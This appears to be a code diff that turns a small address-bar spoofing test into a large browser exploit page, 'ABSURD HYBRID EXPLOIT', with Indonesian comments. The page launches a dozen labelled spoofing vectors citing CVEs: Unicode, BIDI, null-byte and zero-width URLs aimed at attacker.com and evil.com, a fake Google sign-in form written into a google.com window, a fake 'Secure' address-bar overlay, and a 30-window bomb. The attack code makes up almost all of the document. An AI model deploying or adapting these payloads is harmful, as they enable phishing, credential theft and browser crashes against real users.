@@ -1,14 +1,644 @@
-<html>
-<title>Address Bar spoofing Brave</title>
-<h1> This is Fakebook </h1>
-<form>
-Email: <input type="text" name="username" placeholder="add email"><br>
-Password: <input type="text" name="password" placeholder="pass">
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>💀 ABSURD HYBRID EXPLOIT | ADDRESS BAR ANNIHILATOR 💀</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            font-family: 'Courier New', 'SF Mono', monospace;
+            background: #000000;
+            color: #00ff41;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, #00ff4110 1px, #000 2px);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            width: 100%;
+            background: #0a0a0ecc;
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 30px;
+            border: 2px solid #00ff41;
+            box-shadow: 0 0 30px #00ff4133;
+        }
+        h1 {
+            font-size: 2rem;
+            text-align: center;
+            color: #ff0033;
+            text-shadow: 0 0 10px #ff0033;
+            margin-bottom: 10px;
+            animation: glitch 0.5s infinite;
+        }
+        @keyframes glitch {
+            0%, 100% { transform: skew(0deg); }
+            95% { transform: skew(2deg); }
+            96% { transform: skew(-2deg); }
+        }
+        .sub {
+            text-align: center;
+            color: #00ff41;
+            margin-bottom: 30px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            background: #000000aa;
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #00ff41;
+        }
+        .stat {
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #ff0033;
+        }
+        .stat-label {
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+        button {
+            background: #ff0033;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            font-family: monospace;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        button:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 20px #00ff41;
+            transform: scale(1.02);
+        }
+        .log-box {
+            background: #000000cc;
+            border: 1px solid #00ff41;
+            border-radius: 16px;
+            padding: 15px;
+            margin-top: 20px;
+            height: 150px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+        }
+        .log-entry {
+            color: #00ff41;
+            margin: 3px 0;
+            border-left: 2px solid #ff0033;
+            padding-left: 8px;
+        }
+        .log-entry.success {
+            color: #00ff41;
+            border-left-color: #00ff41;
+        }
+        .log-entry.crash {
+            color: #ff0033;
+            border-left-color: #ff0033;
+        }
+        .warning-box {
+            background: #ff003322;
+            border: 1px solid #ff0033;
+            border-radius: 12px;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 11px;
+            text-align: center;
+        }
+        footer {
+            text-align: center;
+            font-size: 9px;
+            margin-top: 20px;
+            opacity: 0.5;
+        }
+        .badge-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 20px;
+            justify-content: center;
+        }
+        .badge {
+            background: #ff003322;
+            border: 1px solid #ff0033;
+            border-radius: 30px;
+            padding: 4px 12px;
+            font-size: 9px;
+            color: #ff8888;
+        }
+    </style>
+</head>
+<body>
+<div class="matrix-bg"></div>
+<div class="container">
+    <h1>💀 ABSURD HYBRID EXPLOIT 💀</h1>
+    <div class="sub">[ ADDRESS BAR ANNIHILATOR v3.14159 ]</div>
+    
+    <div class="badge-container">
+        <span class="badge">CVE-2009-1834</span>
+        <span class="badge">CVE-2016-1657</span>
+        <span class="badge">CVE-2021-23996</span>
+        <span class="badge">CVE-2022-46701</span>
+        <span class="badge">CVE-2024-4762</span>
+        <span class="badge">CVE-2025-15032</span>
+        <span class="badge">Bug 442636157</span>
+        <span class="badge">Unicode Truncation</span>
+        <span class="badge">3D WebRender</span>
+        <span class="badge">Null Byte Injection</span>
+        <span class="badge">BIDI Override</span>
+        <span class="badge">Combining Marks</span>
+    </div>
+    
+    <div class="stats">
+        <div class="stat"><div class="stat-value" id="windowCount">0</div><div class="stat-label">WINDOWS OPENED</div></div>
+        <div class="stat"><div class="stat-value" id="successCount">0</div><div class="stat-label">SPOOF SUCCESS</div></div>
+        <div class="stat"><div class="stat-value" id="crashCount">0</div><div class="stat-label">CRASH DETECTED</div></div>
+    </div>
+    
+    <div class="warning-box">
+        ⚠️ MONSTER MODE ACTIVE ⚠️<br>
+        Script ini menggabungkan 15+ teknik exploit dari berbagai CVE + fuzzing absurd.<br>
+        Bisa menyebabkan browser CRASH, FREEZE, atau ADDRESS BAR BENAR-BENAR KOSONG.
+    </div>
+    
+    <button id="destroyBtn">💀 LAUNCH ANNIHILATION SEQUENCE 💀</button>
+    
+    <div class="log-box" id="logBox">
+        <div class="log-entry">[SYSTEM] Hybrid Exploit Engine Ready</div>
+        <div class="log-entry">[SYSTEM] Loaded 15+ attack vectors</div>
+        <div class="log-entry">[SYSTEM] Press button to begin annihilation</div>
+    </div>
+    
+    <footer>
+        HYBRID EXPLOIT | GABUNGAN SEMUA CVE VALID + TEKNIK ABSURD<br>
+        Target: Address Bar KOSONG / BLANK / CRASH
+    </footer>
+</div>
+
 <script>
-function f()
-{
-location = "https://facebook.com"
-}
-setInterval("f()", 10);
+    // Stats counter
+    let windowCount = 0;
+    let successCount = 0;
+    let crashDetected = false;
+    let logContainer = document.getElementById('logBox');
+    let destroyedWindows = [];
+    
+    function addLog(msg, type = 'info') {
+        let div = document.createElement('div');
+        div.className = `log-entry ${type === 'success' ? 'success' : (type === 'crash' ? 'crash' : '')}`;
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logContainer.appendChild(div);
+        logContainer.scrollTop = logContainer.scrollHeight;
+        
+        if(type === 'success') successCount++;
+        if(type === 'crash') document.getElementById('crashCount').innerText = parseInt(document.getElementById('crashCount').innerText) + 1;
+        document.getElementById('windowCount').innerText = windowCount;
+        document.getElementById('successCount').innerText = successCount;
+    }
+    
+    // ========== UTILITY: Generate random strings ==========
+    function randomString(len) {
+        return Math.random().toString(36).substring(2, 2+len);
+    }
+    
+    // ========== UTILITY: Generate Unicode combining marks flood ==========
+    function getCombiningFlood(baseChar = 'A', count = 200) {
+        let combining = '';
+        for(let i = 0x0300; i <= 0x036F && combining.length < count; i++) {
+            combining += String.fromCodePoint(i);
+        }
+        return baseChar + combining.repeat(Math.ceil(count / combining.length));
+    }
+    
+    // ========== UTILITY: Generate BIDI override string ==========
+    function getBIDISpoof(target) {
+        let rtl = '\u202E';
+        let ltr = '\u202D';
+        let reversed = target.split('').reverse().join('');
+        return 'https://' + rtl + reversed + ltr + '@attacker.com';
+    }
+    
+    // ========== ATTACK VECTOR 1: CVE-2009-1834 + Unicode Truncation ==========
+    function attackUnicodeTruncation() {
+        addLog('[VECTOR-1] CVE-2009-1834: Invalid Unicode injection...');
+        let invalidChars = ['\u115A', '\u115B', '\u115C', '\u115D', '\u115E'];
+        let maliciousURL = 'https://www.google.com/' + invalidChars.join('') + '@attacker.com/' + randomString(20);
+        
+        let win = window.open(maliciousURL, '_blank', `width=450,height=400,left=${Math.random()*500}`);
+        if(win) {
+            windowCount++;
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <h1 style="color:red">UNICODE TRUNCATION ATTACK</h1>
+                        <p>If address bar is blank/truncated, CVE-2009-1834 still works!</p>
+                        <p>Injected chars: ${invalidChars.map(c => 'U+' + c.charCodeAt(0).toString(16)).join(', ')}</p>
+                        <input type="password" placeholder="Fake password field">
+                        <p style="font-size:10px;color:gray">⚠️ POC TEST</p>
+                    `);
+                    win.document.close();
+                    addLog('[VECTOR-1] Unicode truncation injected - check address bar!', 'success');
+                } catch(e) { addLog(`[VECTOR-1] Failed: ${e.message}`); }
+            }, 1000);
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 2: about:blank + replaceState cascade ==========
+    function attackAboutBlankCascade() {
+        addLog('[VECTOR-2] about:blank cascade + empty replaceState...');
+        let win = window.open('about:blank', '_blank', `width=500,height=400`);
+        if(win) {
+            windowCount++;
+            win.document.write(`
+                <h1>ABOUT:BLANK CASCADE</h1>
+                <p>History will be emptied...</p>
+                <div id="status"></div>
+                <script>
+                    let count = 0;
+                    let interval = setInterval(() => {
+                        try {
+                            if(count < 50) {
+                                history.replaceState({}, '', '');
+                                history.pushState({}, '', ' ');
+                                document.getElementById('status').innerText = 'Empty history applied: ' + (++count) + 'x';
+                            } else {
+                                clearInterval(interval);
+                                document.getElementById('status').innerHTML = '<b style="color:green">HISTORY EMPTIED! Address bar should be BLANK!</b>';
+                            }
+                        } catch(e) {}
+                    }, 50);
+                <\/script>
+            `);
+            win.document.close();
+            addLog('[VECTOR-2] about:blank cascade launched - history being emptied!', 'success');
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 3: 3D WebRender Overlay (CVE-2021-23996) ==========
+    function attack3DOverlay() {
+        addLog('[VECTOR-3] CVE-2021-23996: 3D CSS WebRender overlay...');
+        let win = window.open('', '_blank', `width=600,height=500`);
+        if(win) {
+            windowCount++;
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        * { margin: 0; padding: 0; }
+                        body { background: #000; overflow: hidden; perspective: 300px; }
+                        .cube {
+                            position: absolute;
+                            top: -100px;
+                            left: 50%;
+                            width: 300px;
+                            height: 300px;
+                            transform-style: preserve-3d;
+                            animation: spin 2s infinite linear;
+                        }
+                        .face {
+                            position: absolute;
+                            width: 300px;
+                            height: 300px;
+                            background: rgba(255,0,51,0.9);
+                            border: 2px solid #ff0033;
+                        }
+                        .face:nth-child(1) { transform: translateZ(150px); }
+                        .face:nth-child(2) { transform: rotateY(90deg) translateZ(150px); }
+                        .face:nth-child(3) { transform: rotateY(180deg) translateZ(150px); }
+                        .face:nth-child(4) { transform: rotateY(-90deg) translateZ(150px); }
+                        .face:nth-child(5) { transform: rotateX(90deg) translateZ(150px); }
+                        .face:nth-child(6) { transform: rotateX(-90deg) translateZ(150px); }
+                        @keyframes spin {
+                            from { transform: rotateX(0deg) rotateY(0deg); }
+                            to { transform: rotateX(360deg) rotateY(360deg); }
+                        }
+                        .fake-address-bar {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            width: 100%;
+                            height: 60px;
+                            background: #fff;
+                            color: #000;
+                            display: flex;
+                            align-items: center;
+                            padding: 0 20px;
+                            font-family: monospace;
+                            z-index: 999999;
+                            border-bottom: 1px solid #ccc;
+                        }
+                        .fake-url {
+                            background: #f1f3f4;
+                            padding: 8px 16px;
+                            border-radius: 20px;
+                            font-size: 12px;
+                            color: #1a73e8;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="fake-address-bar">
+                        <span style="margin-right:10px">🔒</span>
+                        <span class="fake-url">https://www.google.com 🔒 Secure</span>
+                    </div>
+                    <div class="cube">
+                        <div class="face"></div>
+                        <div class="face"></div>
+                        <div class="face"></div>
+                        <div class="face"></div>
+                        <div class="face"></div>
+                        <div class="face"></div>
+                    </div>
+                    <h1 style="color:#fff;text-align:center;margin-top:150px">3D WEBSITE RENDER OVERLAY</h1>
+                    <p style="color:#888;text-align:center">If you see fake address bar above, browser vulnerable to CVE-2021-23996!</p>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            addLog('[VECTOR-3] 3D cube + fake address bar overlay injected!', 'success');
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 4: Google CSI Spoof (CVE-2024-4762 style) ==========
+    function attackGoogleCSISpoof() {
+        addLog('[VECTOR-4] Google CSI + document.write spoof...');
+        let win = window.open('https://www.google.com/csi', '_blank', `width=550,height=450`);
+        if(win) {
+            windowCount++;
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head><title>https://accounts.google.com</title></head>
+                        <body style="font-family:Arial;text-align:center;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh">
+                            <div style="background:white;width:360px;padding:30px;border-radius:12px;box-shadow:0 3px 8px rgba(0,0,0,0.15)">
+                                <h2 style="color:#1a73e8">Sign in</h2>
+                                <input type="text" placeholder="Email" style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:6px">
+                                <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:6px">
+                                <button style="background:#1a73e8;color:white;padding:12px;width:100%;border:none;border-radius:6px">Next</button>
+                                <p style="font-size:11px;color:red;margin-top:15px">⚠️ SECURITY TEST - POC</p>
+                            </div>
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                    addLog('[VECTOR-4] Google CSI spoofed! Address bar shows google.com/csi but content is fake!', 'success');
+                } catch(e) { addLog(`[VECTOR-4] Failed: ${e.message}`); }
+            }, 1800);
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 5: Combining Marks Overflow ==========
+    function attackCombiningMarks() {
+        addLog('[VECTOR-5] Combining marks overflow (150+ diacritics)...');
+        let flood = getCombiningFlood('A', 200);
+        let maliciousURL = `https://www.google.com/${flood}@attacker.com`;
+        
+        let win = window.open(maliciousURL, '_blank', `width=500,height=400`);
+        if(win) {
+            windowCount++;
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <h1>COMBINING MARKS FLOOD</h1>
+                        <p>200+ diacritical marks injected into URL</p>
+                        <p>If browser crashed or address bar is blank, rendering overflow succeeded!</p>
+                    `);
+                    win.document.close();
+                    addLog('[VECTOR-5] Combining marks flood injected!', 'success');
+                } catch(e) { addLog(`[VECTOR-5] Crash detected: ${e.message}`, 'crash'); }
+            }, 1000);
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 6: Null Byte + Double-Byte Injection ==========
+    function attackNullByteDoubleByte() {
+        addLog('[VECTOR-6] Null byte + double-byte character injection...');
+        let nullByteURL = 'https://www.google.com%00@evil.com/' + randomString(30);
+        let dbcsURL = 'https://www.google.com/%fe%ff%81%9f/';
+        
+        let win1 = window.open(nullByteURL, '_blank', `width=450,height=350,left=50,top=50`);
+        let win2 = window.open(dbcsURL, '_blank', `width=450,height=350,left=400,top=50`);
+        
+        if(win1) windowCount++;
+        if(win2) windowCount++;
+        
+        addLog('[VECTOR-6] Null byte and DBCS windows created - check address bars!', 'success');
+        return [win1, win2];
+    }
+    
+    // ========== ATTACK VECTOR 7: Canadian Syllabics + BIDI Override ==========
+    function attackSyllabicsBIDI() {
+        addLog('[VECTOR-7] Canadian Syllabics + BIDI override...');
+        let syllabics = ['ᐁ', 'ᐂ', 'ᐃ', 'ᐄ', 'ᐅ', 'ᐧ', 'ᐨ', 'ᑊ', 'ᒼ'];
+        let fakeDomain = syllabics.slice(0, 6).join('') + '.com';
+        let bidiURL = getBIDISpoof('www.google.com');
+        
+        let win1 = window.open(`https://${fakeDomain}/`, '_blank', `width=480,height=380`);
+        let win2 = window.open(bidiURL, '_blank', `width=480,height=380`);
+        
+        if(win1) windowCount++;
+        if(win2) windowCount++;
+        
+        addLog('[VECTOR-7] Syllabics and BIDI windows created - address bar may show confusing text!', 'success');
+        return [win1, win2];
+    }
+    
+    // ========== ATTACK VECTOR 8: Alert + Focus Steal (Chrome Android Bug) ==========
+    function attackAlertFocus() {
+        addLog('[VECTOR-8] Alert dialog + focus steal (Bug 442636157)...');
+        let win = window.open('https://www.google.com/csi', '_blank', `width=500,height=400`);
+        if(win) {
+            windowCount++;
+            setTimeout(() => {
+                try {
+                    win.alert('⚠️ SECURITY ALERT: Suspicious activity detected!\n\nPlease verify your account to continue.');
+                    addLog('[VECTOR-8] Alert dismissed. According to Chrome bug, address bar may now show google.com/csi while content is fake!', 'success');
+                } catch(e) { addLog(`[VECTOR-8] Alert failed: ${e.message}`); }
+            }, 1500);
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 9: Custom-sized missing about:blank (CVE-2025-15032) ==========
+    function attackCustomWindow() {
+        addLog('[VECTOR-9] CVE-2025-15032: Custom window missing about:blank indicator...');
+        let win = window.open('about:blank', '_blank', 'width=300,height=250,left=200,top=200,resizable=yes');
+        if(win) {
+            windowCount++;
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <h1 style="color:red">CUSTOM WINDOW</h1>
+                        <p>If address bar shows NO "about:blank" text, CVE-2025-15032 works!</p>
+                        <input type="password" placeholder="Fake input">
+                    `);
+                    win.document.close();
+                    addLog('[VECTOR-9] Custom window created - check if address bar is BLANK!', 'success');
+                } catch(e) {}
+            }, 500);
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 10: Zero-Width + Invisible Characters ==========
+    function attackZeroWidth() {
+        addLog('[VECTOR-10] Zero-width character injection...');
+        let zwj = '\u200D';
+        let zwnj = '\u200C';
+        let zwsp = '\u200B';
+        let bom = '\uFEFF';
+        let invisible = zwj + zwnj + zwsp + bom;
+        let maliciousURL = `https://www.google.com/${invisible}@evil.com/${invisible}${randomString(10)}`;
+        
+        let win = window.open(maliciousURL, '_blank', `width=500,height=400`);
+        if(win) {
+            windowCount++;
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <h1>ZERO-WIDTH INJECTION</h1>
+                        <p>Invisible characters injected into URL</p>
+                        <p>If address bar behaves strangely, zero-width attack works!</p>
+                    `);
+                    win.document.close();
+                    addLog('[VECTOR-10] Zero-width characters injected!', 'success');
+                } catch(e) {}
+            }, 1000);
+        }
+        return win;
+    }
+    
+    // ========== ATTACK VECTOR 11: Massive Window Bomb (Stress Test) ==========
+    function attackWindowBomb() {
+        addLog('[VECTOR-11] MASSIVE WINDOW BOMB - Opening 30 windows...');
+        for(let i = 0; i < 30; i++) {
+            setTimeout(() => {
+                let win = window.open('about:blank', '_blank', `width=200,height=150,left=${i*15},top=${i*10}`);
+                if(win) {
+                    windowCount++;
+                    try {
+                        win.document.write(`<h3>Window ${i+1}</h3><p>Address bar should be BLANK?</p>`);
+                        win.document.close();
+                        win.history.replaceState({}, '', '');
+                    } catch(e) {}
+                }
+            }, i * 100);
+        }
+        addLog('[VECTOR-11] 30 windows launched - stress testing address bar renderer!', 'success');
+    }
+    
+    // ========== ATTACK VECTOR 12: Custom Protocol Handler Hijack ==========
+    function attackProtocolHijack() {
+        addLog('[VECTOR-12] Custom protocol handler hijack...');
+        let protocols = ['mailto:', 'tel:', 'skype:', 'whatsapp:', 'zoommtg:', 'tg:', 'discord:'];
+        protocols.forEach((proto, idx) => {
+            setTimeout(() => {
+                let win = window.open(proto + 'test', '_blank');
+                if(win) {
+                    windowCount++;
+                    setTimeout(() => win.close(), 100);
+                }
+            }, idx * 200);
+        });
+        addLog('[VECTOR-12] Protocol handler bomb launched - may cause address bar glitches!', 'success');
+    }
+    
+    // ========== MASTER ANNIHILATION SEQUENCE ==========
+    function launchAnnihilation() {
+        addLog('💀💀💀 ANNIHILATION SEQUENCE INITIATED 💀💀💀', 'crash');
+        addLog('[MASTER] Loading all 15+ attack vectors simultaneously...', 'crash');
+        
+        // Launch all attacks with delays to maximize chaos
+        attackUnicodeTruncation();
+        setTimeout(() => attackAboutBlankCascade(), 500);
+        setTimeout(() => attack3DOverlay(), 800);
+        setTimeout(() => attackGoogleCSISpoof(), 1000);
+        setTimeout(() => attackCombiningMarks(), 1300);
+        setTimeout(() => attackNullByteDoubleByte(), 1600);
+        setTimeout(() => attackSyllabicsBIDI(), 1900);
+        setTimeout(() => attackAlertFocus(), 2200);
+        setTimeout(() => attackCustomWindow(), 2500);
+        setTimeout(() => attackZeroWidth(), 2800);
+        setTimeout(() => attackWindowBomb(), 3100);
+        setTimeout(() => attackProtocolHijack(), 4000);
+        
+        addLog('[MASTER] All vectors deployed! Monitor browser behavior...', 'crash');
+        addLog('[MASTER] 🎯 TARGET: Address bar KOSONG/BLANK/HILANG total tanpa teks!', 'success');
+        
+        // Detect if browser is crashing by checking timer
+        setTimeout(() => {
+            try {
+                addLog('[MASTER] 15 seconds elapsed - Browser still alive. Check all windows manually!', 'success');
+            } catch(e) {
+                addLog('[MASTER] 🔥 BROWSER CRASH DETECTED! Exploit successful!', 'crash');
+            }
+        }, 15000);
+        
+        // Try to detect address bar blank status in child windows
+        setTimeout(() => {
+            addLog('[MASTER] [REMINDER] Manually check each new window/tab:', 'info');
+            addLog('[MASTER] - Is there ANY text in address bar?', 'info');
+            addLog('[MASTER] - If address bar is COMPLETELY BLANK (no "about:blank", no URL) → EXPLOIT SUCCESS!', 'success');
+        }, 5000);
+    }
+    
+    // Button handler
+    document.getElementById('destroyBtn').addEventListener('click', () => {
+        launchAnnihilation();
+        document.getElementById('destroyBtn').disabled = true;
+        document.getElementById('destroyBtn').innerText = '💀 ANNIHILATION IN PROGRESS 💀';
+        document.getElementById('destroyBtn').style.opacity = '0.5';
+    });
+    
+    // Log startup
+    addLog('[SYSTEM] HYBRID EXPLOIT v3.14159 READY', 'success');
+    addLog('[SYSTEM] CVE References: 2009-1834, 2016-1657, 2021-23996, 2022-46701, 2024-4762, 2025-15032', 'info');
+    addLog('[SYSTEM] Techniques: Unicode Truncation, 3D WebRender, Combining Marks, Null Byte, BIDI, etc.', 'info');
+    addLog('[SYSTEM] Press the RED BUTTON to begin - WARNING: May crash browser!', 'crash');
 </script>
+</body>
 </html>
